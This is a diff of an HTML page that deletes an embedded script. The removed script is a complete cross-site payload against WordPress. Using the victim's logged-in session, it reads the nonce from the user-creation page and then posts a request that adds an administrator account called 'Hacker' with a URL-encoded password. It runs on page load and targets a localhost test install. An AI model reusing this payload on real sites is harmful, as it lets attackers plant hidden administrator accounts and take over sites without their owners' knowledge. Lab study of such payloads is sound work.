@@ -9,35 +9,6 @@
 <body>
     <script>
 
-    let url = "http://localhost/xss/wp-admin/user-new.php";
-    function addAdmin(){
-        let xhr = new XMLHttpRequest();
-
-        xhr.open("GET", url, true);
-
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-        xhr.withCredentials = true;
-
-        xhr.onreadystatechange = function() {//Call a function when the state changes.
-
-        if(xhr.readyState == 4 && xhr.status == 200) {
-
-            var parser=new DOMParser();
-            var xmlDoc=parser.parseFromString(xhr.responseText,"text/xml");
-            var wpnonce = xmlDoc.getElementById("_wpnonce_create-user").value;
-            }
-
-            let secondXhr = new XMLHttpRequest();
-            secondXhr.open("POST", url, true);
-            secondXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            secondXhr.withCredentials = true;
-            secondXhr.send(`action=createuser&_wpnonce_create-user=${wpnonce}&_wp_http_referer=%2Fxss%2Fwp-admin%2Fuser-new.php&user_login=Hacker&email=Maroonx@gmial.com&first_name=Maroon&last_name=x&url=test&pass1=%48%61%63%6b%65%64&pass2=%48%61%63%6b%65%64&send_user_notification=1&role=administrator&createuser=Add+New+User`);
-            
-        };
-        xhr.send();
-    }
-    addAdmin();
 
 
     </script>
